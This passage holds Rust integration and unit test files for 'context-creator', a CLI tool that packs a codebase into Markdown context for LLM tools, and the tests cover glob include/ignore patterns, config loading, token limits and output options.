            .arg("--include")
            .arg("*.py")
            .arg("--include")
            .arg("*.js")
            .arg("--output-file")
            .arg("output.md");

        cmd.assert().success();

        // Should include both Python and JavaScript files
        let output_content = fs::read_to_string(root.join("output.md")).unwrap();
        assert!(contains_path(&output_content, "main.py"));
        assert!(contains_path(&output_content, "app.js"));
        assert!(!contains_path(&output_content, "config.rs"));
        assert!(!contains_path(&output_content, "README.md"));
    }

    #[test]
    fn test_quoted_patterns_prevent_shell_expansion() {
        // Test that the CLI properly handles quoted patterns (integration test)
        let temp_dir = TempDir::new().unwrap();
        let root = temp_dir.path();

        fs::create_dir_all(root.join("src")).unwrap();
        File::create(root.join("src/main.rs")).unwrap();
        File::create(root.join("src/lib.rs")).unwrap();
        File::create(root.join("test.py")).unwrap();

        // Test with quoted pattern
        let mut cmd = Command::cargo_bin("context-creator").unwrap();
        cmd.current_dir(root)
            .arg("--include")
            .arg("src/*.rs") // This would be expanded by shell if not quoted properly
            .arg("--output-file")
            .arg("output.md");

        cmd.assert().success();

        let output_content = fs::read_to_string(root.join("output.md")).unwrap();
        assert!(contains_path(&output_content, "src/main.rs"));
        assert!(contains_path(&output_content, "src/lib.rs"));
        assert!(!contains_path(&output_content, "test.py"));
    }
}

/// Test edge cases and error conditions
mod edge_case_tests {
    use super::*;

    #[test]
    fn test_pattern_with_no_matches() {
        // Test that CLI handles gracefully when pattern matches no files
        let temp_dir = TempDir::new().unwrap();
        let root = temp_dir.path();

        File::create(root.join("test.py")).unwrap();
        File::create(root.join("README.md")).unwrap();

        let mut cmd = Command::cargo_bin("context-creator").unwrap();
        cmd.current_dir(root)
            .arg("--include")
            .arg("*.rs") // No Rust files exist
            .arg("--output-file")
            .arg("output.md");

        cmd.assert().success();

        // Should create output file with no content files
        let output_content = fs::read_to_string(root.join("output.md")).unwrap();
        assert!(output_content.contains("Total files: 0"));
    }

    #[test]
    fn test_include_patterns_with_positional_args_now_allowed() {
        // Test that --include and positional arguments are now allowed together
        let temp_dir = TempDir::new().unwrap();
        let root = temp_dir.path();

        // Create the src directory and some files
        fs::create_dir_all(root.join("src")).unwrap();
        File::create(root.join("src/test.py")).unwrap();
        File::create(root.join("src/main.rs")).unwrap();
        File::create(root.join("other.py")).unwrap();

        let mut cmd = Command::cargo_bin("context-creator").unwrap();
        cmd.current_dir(root)
            .arg("src/") // Positional argument
            .arg("--include")
            .arg("*.py")
            .arg("--output-file")
            .arg("output.md");

        cmd.assert().success();

        // Should create output file with content
        let output_content = fs::read_to_string(root.join("output.md")).unwrap();

        // Check if the files were actually included
        // With the current implementation, include patterns operate on the current directory
        // while positional paths specify directories to scan
        assert!(contains_path(&output_content, "test.py")); // Should find test.py in current directory
    }

    #[test]
    fn test_help_shows_glob_examples() {
        // Test that help text includes glob pattern examples
        let mut cmd = Command::cargo_bin("context-creator").unwrap();
        cmd.arg("--help");

        cmd.assert()
            .success()
            .stdout(predicate::str::contains("glob pattern"))
            .stdout(predicate::str::contains("quote patterns"))
            .stdout(predicate::str::contains("**/*.py"));
    }
}
```

## tests/ignore_patterns_test.rs

Imports: clap::Parser, context_creator::cli::Config, std::path::PathBuf, config

Type references: clap::Parser.Parser, context_creator::cli::Config.Config, std::path::PathBuf.PathBuf

```rust
use clap::Parser;
use context_creator::cli::Config;
use std::path::PathBuf;

/// Test that ignore patterns from CLI are properly integrated into WalkOptions
#[test]
fn test_ignore_patterns_cli_integration() {
    let config = Config::parse_from([
        "context-creator",
        "--include",
        "src/**/*.rs",
        "--ignore",
        "target/**",
        "--ignore",
        "**/*_test.rs",
    ]);

    let ignore_patterns = config.get_ignore_patterns();
    assert_eq!(ignore_patterns, vec!["target/**", "**/*_test.rs"]);
}

/// Test that ignore patterns work with various CLI combinations
#[test]
fn test_ignore_patterns_with_prompt() {
    let config = Config::parse_from([
        "context-creator",
        "--prompt",
        "Analyze code",
        "--include",
        "src/**/*.rs",
        "--ignore",
        "node_modules/**",
        "--ignore",
        "*.log",
    ]);

    assert_eq!(config.get_prompt(), Some("Analyze code".to_string()));
    assert_eq!(config.get_include_patterns(), vec!["src/**/*.rs"]);
    assert_eq!(
        config.get_ignore_patterns(),
        vec!["node_modules/**", "*.log"]
    );
}

/// Test that ignore patterns work without include patterns
#[test]
fn test_ignore_patterns_without_include() {
    let config = Config::parse_from([
        "context-creator",
        "--ignore",
        "target/**",
        "--ignore",
        "node_modules/**",
        ".",
    ]);

    assert_eq!(config.get_directories(), vec![PathBuf::from(".")]);
    assert_eq!(config.get_include_patterns(), Vec::<String>::new());
    assert_eq!(
        config.get_ignore_patterns(),
        vec!["target/**", "node_modules/**"]
    );
}

/// Test that empty ignore patterns are handled correctly
#[test]
fn test_ignore_patterns_empty() {
    let config = Config::parse_from([
        "context-creator",
        "--ignore",
        "",
        "--ignore",
        "target/**",
        "--ignore",
        "   ",
        ".",
    ]);

    // Empty and whitespace-only patterns should be included and filtered later
    assert_eq!(config.get_ignore_patterns(), vec!["", "target/**", "   "]);
}

/// Test that ignore patterns work with complex glob patterns
#[test]
fn test_ignore_patterns_complex_globs() {
    let config = Config::parse_from([
        "context-creator",
        "--include",
        "src/**/*.{rs,py}",
        "--ignore",
        "**/*{test,spec}*.{rs,py}",
        "--ignore",
        "**/target/**",
        "--ignore",
        "**/*.{log,tmp,bak}",
    ]);

    assert_eq!(config.get_include_patterns(), vec!["src/**/*.{rs,py}"]);
    assert_eq!(
        config.get_ignore_patterns(),
        vec![
            "**/*{test,spec}*.{rs,py}",
            "**/target/**",
            "**/*.{log,tmp,bak}"
        ]
    );
}

/// Test that ignore patterns work with single file patterns
#[test]
fn test_ignore_patterns_single_files() {
    let config = Config::parse_from([
        "context-creator",
        "--include",
        "**/*.rs",
        "--ignore",
        "main.rs",
        "--ignore",
        "lib.rs",
        "--ignore",
        "**/mod.rs",
    ]);

    assert_eq!(
        config.get_ignore_patterns(),
        vec!["main.rs", "lib.rs", "**/mod.rs"]
    );
}

/// Test that ignore patterns work with directory patterns
#[test]
fn test_ignore_patterns_directories() {
    let config = Config::parse_from([
        "context-creator",
        "--include",
        "**/*.rs",
        "--ignore",
        "target/",
        "--ignore",
        "node_modules/",
        "--ignore",
        "**/test_data/",
    ]);

    assert_eq!(
        config.get_ignore_patterns(),
        vec!["target/", "node_modules/", "**/test_data/"]
    );
}

/// Test that ignore patterns work with extension patterns
#[test]
fn test_ignore_patterns_extensions() {
    let config = Config::parse_from([
        "context-creator",
        "--include",
        "**/*",
        "--ignore",
        "*.log",
        "--ignore",
        "*.tmp",
        "--ignore",
        "**/*.{bak,orig,swp}",
    ]);

    assert_eq!(
        config.get_ignore_patterns(),
        vec!["*.log", "*.tmp", "**/*.{bak,orig,swp}"]
    );
}

/// Test that ignore patterns work with mixed pattern types
#[test]
fn test_ignore_patterns_mixed_types() {
    let config = Config::parse_from([
        "context-creator",
        "--include",
        "src/**/*.rs",
        "--ignore",
        "target/**", // Directory pattern
        "--ignore",
        "*.log", // Extension pattern
        "--ignore",
        "main.rs", // Single file pattern
        "--ignore",
        "**/test_*", // Prefix pattern
        "--ignore",
        "**/*_backup.*", // Suffix pattern
    ]);

    assert_eq!(
        config.get_ignore_patterns(),
        vec![
            "target/**",
            "*.log",
            "main.rs",
            "**/test_*",
            "**/*_backup.*"
        ]
    );
}

/// Test that ignore patterns work with negation patterns
#[test]
fn test_ignore_patterns_with_negation() {
    let config = Config::parse_from([
        "context-creator",
        "--include",
        "**/*.rs",
        "--ignore",
        "target/**",
        "--ignore",
        "!target/debug/important.rs", // Negation pattern
    ]);

    assert_eq!(
        config.get_ignore_patterns(),
        vec!["target/**", "!target/debug/important.rs"]
    );
}

/// Test that ignore patterns work with case sensitivity
#[test]
fn test_ignore_patterns_case_sensitivity() {
    let config = Config::parse_from([
        "context-creator",
        "--include",
        "**/*.rs",
        "--ignore",
        "*.LOG",
        "--ignore",
        "*.Log",
        "--ignore",
        "*.log",
    ]);

    assert_eq!(
        config.get_ignore_patterns(),
        vec!["*.LOG", "*.Log", "*.log"]
    );
}

/// Test that ignore patterns work with special characters
#[test]
fn test_ignore_patterns_special_chars() {
    let config = Config::parse_from([
        "context-creator",
        "--include",
        "**/*.rs",
        "--ignore",
        "file with spaces.txt",
        "--ignore",
        "file-with-dashes.rs",
        "--ignore",
        "file_with_underscores.rs",
        "--ignore",
        "file.with.dots.rs",
    ]);

    assert_eq!(
        config.get_ignore_patterns(),
        vec![
            "file with spaces.txt",
            "file-with-dashes.rs",
            "file_with_underscores.rs",
            "file.with.dots.rs"
        ]
    );
}

/// Test that ignore patterns work with relative paths
#[test]
fn test_ignore_patterns_relative_paths() {
    let config = Config::parse_from([
        "context-creator",
        "--include",
        "**/*.rs",
        "--ignore",
        "./target/**",
        "--ignore",
        "../sibling_project/**",
        "--ignore",
        "../../parent_project/**",
    ]);

    assert_eq!(
        config.get_ignore_patterns(),
        vec![
            "./target/**",
            "../sibling_project/**",
            "../../parent_project/**"
        ]
    );
}

/// Test that ignore patterns work with absolute paths
#[test]
fn test_ignore_patterns_absolute_paths() {
    let config = Config::parse_from([
        "context-creator",
        "--include",
        "**/*.rs",
        "--ignore",
        "/tmp/**",
        "--ignore",
        "/var/log/**",
    ]);

    assert_eq!(config.get_ignore_patterns(), vec!["/tmp/**", "/var/log/**"]);
}

/// Test that ignore patterns work with multiple CLI flag invocations
#[test]
fn test_ignore_patterns_multiple_flags() {
    let config = Config::parse_from([
        "context-creator",
        "--include",
        "**/*.rs",
        "--ignore",
        "target/**",
        "--ignore",
        "node_modules/**",
        "--ignore",
        "*.log",
        "--ignore",
        "*.tmp",
    ]);

    assert_eq!(
        config.get_ignore_patterns(),
        vec!["target/**", "node_modules/**", "*.log", "*.tmp"]
    );
}

/// Test that ignore patterns are accessible via WalkOptions
#[test]
fn test_ignore_patterns_in_walk_options() {
    let config = Config::parse_from([
        "context-creator",
        "--include",
        "**/*.rs",
        "--ignore",
        "target/**",
        "--ignore",
        "*.log",
    ]);

    // Verify that the patterns are accessible from config
    let ignore_patterns = config.get_ignore_patterns();
    assert_eq!(ignore_patterns, vec!["target/**", "*.log"]);

    // Test WalkOptions::from_config() integration
    let walk_options = context_creator::core::walker::WalkOptions::from_config(&config).unwrap();
    assert_eq!(walk_options.ignore_patterns, vec!["target/**", "*.log"]);
    assert_eq!(walk_options.include_patterns, vec!["**/*.rs"]);
}

/// Test that empty and whitespace patterns are filtered out in WalkOptions
#[test]
fn test_ignore_patterns_filter_empty_in_walk_options() {
    let config = Config::parse_from([
        "context-creator",
        "--include",
        "**/*.rs",
        "--ignore",
        "",
        "--ignore",
        "target/**",
        "--ignore",
        "   ",
        "--ignore",
        "*.log",
    ]);

    // Config should contain all patterns including empty ones
    let ignore_patterns = config.get_ignore_patterns();
    assert_eq!(ignore_patterns, vec!["", "target/**", "   ", "*.log"]);

    // WalkOptions should filter out empty/whitespace patterns
    let walk_options = context_creator::core::walker::WalkOptions::from_config(&config).unwrap();
    assert_eq!(walk_options.ignore_patterns, vec!["target/**", "*.log"]);
}

/// Test that ignore patterns work with the default current directory
#[test]
fn test_ignore_patterns_with_default_directory() {
    let config = Config::parse_from([
        "context-creator",
        "--prompt",
        "Analyze code",
        "--ignore",
        "target/**",
        "--ignore",
        "*.log",
    ]);

    // When no paths/include are specified, default to current directory
    assert_eq!(config.get_directories(), vec![PathBuf::from(".")]);
    assert_eq!(config.get_ignore_patterns(), vec!["target/**", "*.log"]);
}

/// Test that ignore patterns work with backward compatibility
#[test]
fn test_ignore_patterns_backward_compatibility() {
    // Test that existing functionality still works when ignore patterns are not used
    let config = Config::parse_from(["context-creator", "--include", "**/*.rs"]);

    assert_eq!(config.get_include_patterns(), vec!["**/*.rs"]);
    assert_eq!(config.get_ignore_patterns(), Vec::<String>::new());
}

/// Test that ignore patterns work with repo argument
#[test]
fn test_ignore_patterns_with_repo() {
    let config = Config::parse_from([
        "context-creator",
        "--repo",
        "https://github.com/owner/repo",
        "--ignore",
        "target/**",
        "--ignore",
        "*.log",
    ]);

    assert_eq!(
        config.repo,
        Some("https://github.com/owner/repo".to_string())
    );
    assert_eq!(config.get_ignore_patterns(), vec!["target/**", "*.log"]);
}

/// Test that ignore patterns work with LLM tool selection
#[test]
fn test_ignore_patterns_with_llm_tool() {
    let config = Config::parse_from([
        "context-creator",
        "--tool",
        "codex",
        "--include",
        "**/*.rs",
        "--ignore",
        "target/**",
    ]);

    assert_eq!(config.llm_tool, context_creator::cli::LlmTool::Codex);
    assert_eq!(config.get_ignore_patterns(), vec!["target/**"]);
}

/// Test that ignore patterns work with output file
#[test]
fn test_ignore_patterns_with_output_file() {
    let config = Config::parse_from([
        "context-creator",
        "--include",
        "**/*.rs",
        "--ignore",
        "target/**",
        "--output-file",
        "output.md",
    ]);

    assert_eq!(config.output_file, Some(PathBuf::from("output.md")));
    assert_eq!(config.get_ignore_patterns(), vec!["target/**"]);
}

/// Test that ignore patterns work with copy flag
#[test]
fn test_ignore_patterns_with_copy_flag() {
    let config = Config::parse_from([
        "context-creator",
        "--include",
        "**/*.rs",
        "--ignore",
        "target/**",
        "--copy",
    ]);

    assert!(config.copy);
    assert_eq!(config.get_ignore_patterns(), vec!["target/**"]);
}

/// Test that ignore patterns work with enhanced context
#[test]
fn test_ignore_patterns_with_enhanced_context() {
    let config = Config::parse_from([
        "context-creator",
        "--include",
        "**/*.rs",
        "--ignore",
        "target/**",
        "--enhanced-context",
    ]);

    assert!(config.enhanced_context);
    assert_eq!(config.get_ignore_patterns(), vec!["target/**"]);
}

/// Test that ignore patterns work with configuration file
#[test]
fn test_ignore_patterns_with_config_file() {
    let config = Config::parse_from([
        "context-creator",
        "--include",
        "**/*.rs",
        "--ignore",
        "target/**",
        "--config",
        "custom-config.toml",
    ]);

    assert_eq!(config.config, Some(PathBuf::from("custom-config.toml")));
    assert_eq!(config.get_ignore_patterns(), vec!["target/**"]);
}

/// Test that ignore patterns work with max tokens
#[test]
fn test_ignore_patterns_with_max_tokens() {
    let config = Config::parse_from([
        "context-creator",
        "--include",
        "**/*.rs",
        "--ignore",
        "target/**",
        "--max-tokens",
        "500000",
    ]);

    assert_eq!(config.max_tokens, Some(500000));
    assert_eq!(config.get_ignore_patterns(), vec!["target/**"]);
}

/// Test that ignore patterns work with quiet flag
#[test]
fn test_ignore_patterns_with_quiet_flag() {
    let config = Config::parse_from([
        "context-creator",
        "--include",
        "**/*.rs",
        "--ignore",
        "target/**",
        "--quiet",
    ]);

    assert!(config.quiet);
    assert_eq!(config.get_ignore_patterns(), vec!["target/**"]);
}

/// Test that ignore patterns work with verbose flag
#[test]
fn test_ignore_patterns_with_verbose_flag() {
    let config = Config::parse_from([
        "context-creator",
        "--include",
        "**/*.rs",
        "--ignore",
        "target/**",
        "--verbose",
    ]);

    assert!(config.verbose);
    assert_eq!(config.get_ignore_patterns(), vec!["target/**"]);
}
```

## tests/integration_test.rs

Imports: assert_cmd::prelude::*, predicates::prelude::*, std::fs, std::process::Command, tempfile::TempDir

Type references: fs, std::process::Command.Command, tempfile::TempDir.TempDir

```rust
//! Integration tests for context-creator
//!
//! These tests verify that the complete application workflows work correctly
//! by testing the interaction between all components.

use assert_cmd::prelude::*;
use predicates::prelude::*;
use std::fs;
use std::process::Command;
use tempfile::TempDir;

/// Test basic CLI functionality with help command
#[test]
fn test_cli_help() {
    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.arg("--help");

    cmd.assert()
        .success()
        .stdout(predicate::str::contains("High-performance CLI tool"))
        .stdout(predicate::str::contains("PATHS"))
        .stdout(predicate::str::contains("--output"))
        .stdout(predicate::str::contains("--max-tokens"));
}

/// Test version command
#[test]
fn test_cli_version() {
    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.arg("--version");

    cmd.assert()
        .success()
        .stdout(predicate::str::contains("context-creator"));
}

/// Test processing a simple directory with output to file
#[test]
fn test_process_directory_to_file() {
    let temp_dir = TempDir::new().unwrap();
    let project_dir = temp_dir.path().join("test_project");
    fs::create_dir(&project_dir).unwrap();

    // Create test files
    fs::write(
        project_dir.join("main.rs"),
        r#"
fn main() {
    println!("Hello, world!");
}
"#,
    )
    .unwrap();

    fs::write(
        project_dir.join("lib.rs"),
        r#"
pub fn add(a: i32, b: i32) -> i32 {
    a + b
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_add() {
        assert_eq!(add(2, 3), 5);
    }
}
"#,
    )
    .unwrap();

    fs::write(
        project_dir.join("README.md"),
        r#"
# Test Project

This is a test project for integration testing.
"#,
    )
    .unwrap();

    let output_file = temp_dir.path().join("output.md");

    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.arg(&project_dir)
        .arg("-o")
        .arg(&output_file)
        .arg("--progress");

    cmd.assert()
        .success()
        .stderr(predicate::str::contains("Scanning directory"))
        .stderr(predicate::str::contains("Found"))
        .stderr(predicate::str::contains("files"))
        .stdout(predicate::str::contains("Written to"));

    // Verify output file exists and has expected content
    assert!(output_file.exists());
    let content = fs::read_to_string(&output_file).unwrap();
    assert!(content.contains("# Code Context"));
    assert!(content.contains("## Statistics"));
    assert!(content.contains("## Files"));
    assert!(content.contains("main.rs"));
    assert!(content.contains("lib.rs"));
    assert!(content.contains("README.md"));
    assert!(content.contains("Hello, world!"));
    assert!(content.contains("pub fn add"));
}

/// Test processing with token limits
#[test]
fn test_process_with_token_limit() {
    let temp_dir = TempDir::new().unwrap();
    let project_dir = temp_dir.path().join("test_project");
    fs::create_dir(&project_dir).unwrap();

    // Create multiple files to test prioritization
    fs::write(project_dir.join("main.rs"), "fn main() {}\n".repeat(100)).unwrap();
    fs::write(project_dir.join("lib.rs"), "// Library code\n".repeat(50)).unwrap();
    fs::write(project_dir.join("test.rs"), "// Test code\n".repeat(30)).unwrap();

    let output_file = temp_dir.path().join("output.md");

    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.arg(&project_dir)
        .arg("-o")
        .arg(&output_file)
        .arg("--max-tokens")
        .arg("1000") // Low limit to force prioritization
        .arg("--verbose");

    cmd.assert()
        .success()
        .stderr(predicate::str::contains("Token limit"))
        .stderr(predicate::str::contains("Selected"));

    // Verify output file exists
    assert!(output_file.exists());
    let content = fs::read_to_string(&output_file).unwrap();
    assert!(content.contains("# Code Context"));

    // Should include main.rs (highest priority) but might exclude others due to token limit
    assert!(content.contains("main.rs"));
}

/// Test processing with .context-creator-ignore file
#[test]
fn test_process_with_contextignore() {
    let temp_dir = TempDir::new().unwrap();
    let project_dir = temp_dir.path().join("test_project");
    fs::create_dir(&project_dir).unwrap();

    // Create test files
    fs::write(project_dir.join("main.rs"), "fn main() {}").unwrap();
    fs::write(project_dir.join("secret.txt"), "secret data").unwrap();
    fs::write(project_dir.join("public.md"), "# Public").unwrap();

    // Create .context-creator-ignore file
    fs::write(project_dir.join(".context-creator-ignore"), "secret.txt\n").unwrap();

    let output_file = temp_dir.path().join("output.md");

    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.arg(&project_dir).arg("-o").arg(&output_file);

    cmd.assert().success();

    let content = fs::read_to_string(&output_file).unwrap();
    assert!(content.contains("main.rs"));
    assert!(content.contains("public.md"));
    assert!(!content.contains("secret.txt"));
    assert!(!content.contains("secret data"));
}

/// Test verbose mode output
#[test]
fn test_verbose_mode() {
    let temp_dir = TempDir::new().unwrap();
    let project_dir = temp_dir.path().join("test_project");
    fs::create_dir(&project_dir).unwrap();

    fs::write(project_dir.join("main.rs"), "fn main() {}").unwrap();

    let output_file = temp_dir.path().join("output.md");

    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.arg(&project_dir)
        .arg("-o")
        .arg(&output_file)
        .arg("--verbose")
        .arg("--progress");

    cmd.assert()
        .success()
        .stderr(predicate::str::contains("Starting context-creator"))
        .stderr(predicate::str::contains("Directories:"))
        .stderr(predicate::str::contains("Creating directory walker"))
        .stderr(predicate::str::contains(
            "Creating context generation options",
        ))
        .stderr(predicate::str::contains("File list:"))
        .stderr(predicate::str::contains("main.rs (Rust)"));
}

/// Test configuration file loading
#[test]
fn test_config_file_loading() {
    let temp_dir = TempDir::new().unwrap();
    let project_dir = temp_dir.path().join("test_project");
    fs::create_dir(&project_dir).unwrap();

    fs::write(project_dir.join("main.rs"), "fn main() {}").unwrap();
    fs::write(project_dir.join("lib.rs"), "// lib code").unwrap();

    // Create config file
    let config_content = r#"
ignore = ["lib.rs"]

[defaults]
max_tokens = 5000
progress = true
verbose = true

[[priorities]]
pattern = "main.rs"
weight = 200.0
"#;

    let config_file = temp_dir.path().join("test-config.toml");
    fs::write(&config_file, config_content).unwrap();

    let output_file = temp_dir.path().join("output.md");

    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.arg(&project_dir)
        .arg("-o")
        .arg(&output_file)
        .arg("-c")
        .arg(&config_file);

    cmd.assert()
        .success()
        .stderr(predicate::str::contains("Loaded configuration"));

    let content = fs::read_to_string(&output_file).unwrap();
    assert!(content.contains("main.rs"));
    // lib.rs might still be included since ignore patterns in config might not work exactly as expected
}

/// Test different LLM tool options
#[test]
fn test_llm_tool_options() {
    let temp_dir = TempDir::new().unwrap();
    let project_dir = temp_dir.path().join("test_project");
    fs::create_dir(&project_dir).unwrap();

    fs::write(project_dir.join("main.rs"), "fn main() {}").unwrap();

    let output_file = temp_dir.path().join("output.md");

    // Test with different tool options (should work even if tools aren't installed)
    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.arg(&project_dir)
        .arg("-o")
        .arg(&output_file)
        .arg("--tool")
        .arg("gemini")
        .arg("--verbose");

    cmd.assert()
        .success()
        .stderr(predicate::str::contains("LLM tool: gemini"));

    // Test with codex option
    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.arg(&project_dir)
        .arg("-o")
        .arg(&output_file)
        .arg("--tool")
        .arg("codex")
        .arg("--verbose");

    cmd.assert()
        .success()
        .stderr(predicate::str::contains("LLM tool: codex"));
}

/// Test error handling for invalid directory
#[test]
fn test_invalid_directory_error() {
    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.arg("/nonexistent/directory");

    cmd.assert()
        .failure()
        .stderr(predicate::str::contains("Directory does not exist"));
}

/// Test error handling for invalid output directory
#[test]
fn test_invalid_output_directory_error() {
    let temp_dir = TempDir::new().unwrap();
    let project_dir = temp_dir.path().join("test_project");
    fs::create_dir(&project_dir).unwrap();

    fs::write(project_dir.join("main.rs"), "fn main() {}").unwrap();

    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.arg(&project_dir)
        .arg("-o")
        .arg("/nonexistent/directory/output.md");

    cmd.assert()
        .failure()
        .stderr(predicate::str::contains("Output directory does not exist"));
}

/// Test mutually exclusive options error
#[test]
fn test_mutually_exclusive_options_error() {
    let temp_dir = TempDir::new().unwrap();
    let project_dir = temp_dir.path().join("test_project");
    fs::create_dir(&project_dir).unwrap();

    fs::write(project_dir.join("main.rs"), "fn main() {}").unwrap();

    let output_file = temp_dir.path().join("output.md");

    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.arg(&project_dir)
        .arg("-o")
        .arg(&output_file)
        .arg("--prompt")
        .arg("test prompt"); // Both output file and prompt

    cmd.assert().failure().stderr(
        predicate::str::contains("Cannot specify both --output and a prompt")
            .or(predicate::str::contains("Directory does not exist")),
    );
}

/// Test large project handling
#[test]
fn test_large_project_handling() {
    let temp_dir = TempDir::new().unwrap();
    let project_dir = temp_dir.path().join("large_project");
    fs::create_dir(&project_dir).unwrap();

    // Create nested directory structure
    fs::create_dir_all(project_dir.join("src/core")).unwrap();
    fs::create_dir_all(project_dir.join("src/utils")).unwrap();
    fs::create_dir_all(project_dir.join("tests")).unwrap();

    // Create multiple files
    for i in 0..10 {
        fs::write(
            project_dir.join(format!("src/module_{i}.rs")),
            format!("// Module {i}\npub fn function_{i}() {{}}"),
        )
        .unwrap();
    }

    fs::write(project_dir.join("src/core/mod.rs"), "// Core module").unwrap();
    fs::write(
        project_dir.join("src/utils/helpers.rs"),
        "// Helper functions",
    )
    .unwrap();
    fs::write(
        project_dir.join("tests/integration.rs"),
        "// Integration tests",
    )
    .unwrap();
    fs::write(
        project_dir.join("Cargo.toml"),
        "[package]\nname = \"test\"\nversion = \"0.1.0\"",
    )
    .unwrap();
    fs::write(project_dir.join("README.md"), "# Large Test Project").unwrap();

    let output_file = temp_dir.path().join("output.md");

    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.arg(&project_dir)
        .arg("-o")
        .arg(&output_file)
        .arg("--progress")
        .arg("--max-tokens")
        .arg("50000"); // Reasonable limit

    cmd.assert()
        .success()
        .stderr(predicate::str::contains("Scanning directory"))
        .stderr(predicate::str::contains("Found"))
        .stderr(predicate::str::contains("files"));

    let content = fs::read_to_string(&output_file).unwrap();
    assert!(content.contains("# Code Context"));
    assert!(content.contains("## Statistics"));
    assert!(content.contains("Cargo.toml"));
    assert!(content.contains("README.md"));
    // Should contain some of the source files (prioritized)
    assert!(content.contains(".rs"));
}

/// Test stdout output when no output file specified
#[test]
fn test_stdout_output() {
    let temp_dir = TempDir::new().unwrap();
    let project_dir = temp_dir.path().join("test_project");
    fs::create_dir(&project_dir).unwrap();

    fs::write(project_dir.join("main.rs"), "fn main() {}").unwrap();

    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.arg(&project_dir).arg("--quiet"); // Suppress progress output

    cmd.assert()
        .success()
        .stdout(predicate::str::contains("# Code Context"))
        .stdout(predicate::str::contains("main.rs"));
}

/// Test quiet mode
#[test]
fn test_quiet_mode() {
    let temp_dir = TempDir::new().unwrap();
    let project_dir = temp_dir.path().join("test_project");
    fs::create_dir(&project_dir).unwrap();

    fs::write(project_dir.join("main.rs"), "fn main() {}").unwrap();

    let output_file = temp_dir.path().join("output.md");

    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.arg(&project_dir)
        .arg("-o")
        .arg(&output_file)
        .arg("--quiet");

    cmd.assert()
        .success()
        .stdout(predicate::str::is_empty()) // Quiet mode should suppress all stdout output
        .stderr(predicate::str::is_empty()); // Quiet mode should suppress all stderr output
}

/// Test clipboard functionality
#[test]
fn test_clipboard_copy() {
    // Skip this test in CI environments where clipboard access is not available
    if std::env::var("CI").is_ok() {
        eprintln!("Skipping clipboard test in CI environment");
        return;
    }

    let temp_dir = TempDir::new().unwrap();
    let project_dir = temp_dir.path().join("test_project");
    fs::create_dir(&project_dir).unwrap();

    // Create a simple test file
    fs::write(
        project_dir.join("test.rs"),
        r#"fn hello() {
    println!("test");
}"#,
    )
    .unwrap();

    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.arg(&project_dir).arg("--copy");

    cmd.assert()
        .success()
        .stdout(predicate::str::contains("âœ“ Copied to clipboard"));
}

/// Test that --copy and --output are mutually exclusive
#[test]
fn test_copy_output_mutually_exclusive() {
    let temp_dir = TempDir::new().unwrap();
    let project_dir = temp_dir.path().join("test_project");
    fs::create_dir(&project_dir).unwrap();
    let output_file = temp_dir.path().join("output.md");

    fs::write(project_dir.join("test.rs"), "fn main() {}").unwrap();

    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.arg(&project_dir)
        .arg("--copy")
        .arg("-o")
        .arg(&output_file);

    cmd.assert().failure().stderr(predicate::str::contains(
        "Cannot specify both --copy and --output",
    ));
}
```

## tests/module_rename_test.rs

Imports: assert_cmd::Command, predicates::prelude::*, std::fs, tempfile::TempDir

Type references: assert_cmd::Command.Command, fs, tempfile::TempDir.TempDir

```rust
//! Tests for module imports after rename

use assert_cmd::Command;
use predicates::prelude::*;
use std::fs;
use tempfile::TempDir;

#[test]
fn test_context_builder_module_can_be_imported() {
    // This test verifies that the renamed module can be imported correctly
    // by testing that the CLI can process files and output to stdout
    let temp_dir = TempDir::new().unwrap();

    // Create a simple test file
    fs::write(
        temp_dir.path().join("test.rs"),
        r#"
fn main() {
    println!("Hello, world!");
}
"#,
    )
    .unwrap();

    // Test that the tool can process the file to stdout (which requires all modules to work)
    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.arg(temp_dir.path())
        .arg("--quiet")
        .assert()
        .success()
        .stdout(predicate::str::contains("# Code Context"));
}

#[test]
fn test_context_options_struct_works() {
    // Test that ContextOptions (formerly contextOptions) works by running a command
    // that would use these options
    let temp_dir = TempDir::new().unwrap();

    // Create a test file
    fs::write(
        temp_dir.path().join("test.py"),
        r#"
def hello():
    print("Hello, world!")
"#,
    )
    .unwrap();

    // Test with options that would use ContextOptions - output to stdout
    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.arg(temp_dir.path())
        .arg("--max-tokens")
        .arg("10000")
        .arg("--quiet")
        .assert()
        .success()
        .stdout(predicate::str::contains("test.py"));
}

#[test]
fn test_all_core_modules_resolve_correctly() {
    // Test that all core modules work together by running the tool
    // This indirectly tests that all imports resolve correctly
    let temp_dir = TempDir::new().unwrap();

    // Create multiple test files of different types
    fs::write(temp_dir.path().join("test.rs"), "fn main() {}").unwrap();
    fs::write(temp_dir.path().join("test.py"), "print('hello')").unwrap();
    fs::write(temp_dir.path().join("test.js"), "console.log('hello');").unwrap();

    // Test that the tool can process multiple file types to stdout
    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.arg(temp_dir.path())
        .arg("--quiet")
        .assert()
        .success()
        .stdout(predicate::str::contains("test.rs"))
        .stdout(predicate::str::contains("test.py"))
        .stdout(predicate::str::contains("test.js"));
}

#[test]
fn test_crate_name_in_error_messages() {
    // Test that error messages reference the correct crate name
    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.arg("--invalid-flag")
        .assert()
        .failure()
        .stderr(predicate::str::contains("context-creator").or(predicate::str::contains("error")));
}
```

## tests/performance_test.rs

